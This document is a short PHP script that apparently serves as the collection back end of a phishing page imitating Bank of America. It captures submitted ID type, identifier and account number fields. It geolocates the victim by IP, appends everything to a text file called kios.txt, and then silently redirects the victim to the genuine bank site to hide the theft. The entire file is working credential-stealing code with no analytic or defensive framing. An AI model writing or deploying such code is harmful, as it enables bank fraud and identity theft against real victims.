<?php
@session_start();
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];
$k1 = $_POST['g1'];
$k2 = $_POST['g2'];
$k3 = $_POST['g3'];
$k4 = $_POST['g4'];


if (isset ($k1) && isset ($k2) && isset ($k3) ) {
  $dedon = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

  $country = $dedon->country;
  $city = $dedon->city;
  
  $time = date('Y-m-d H:i:s');
  $dat = fopen('kios.txt', 'a');
  fwrite($dat, "|| Tipo: $k1 - Identifi: $k2 - Numero: $k3 $country $city  $time - $ip\n||--------------------------------->\n");
  
  header("Location: https://www.bankofamerica.com/es/");
  exit;
}
?>